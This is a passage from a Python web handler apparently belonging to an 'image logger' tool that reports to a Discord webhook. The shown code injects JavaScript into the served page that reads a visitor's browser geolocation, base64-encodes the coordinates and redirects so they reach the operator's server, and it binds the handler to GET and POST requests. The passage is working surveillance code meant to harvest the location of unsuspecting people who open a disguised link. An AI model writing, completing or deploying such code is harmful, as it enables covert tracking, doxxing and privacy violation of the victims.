    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
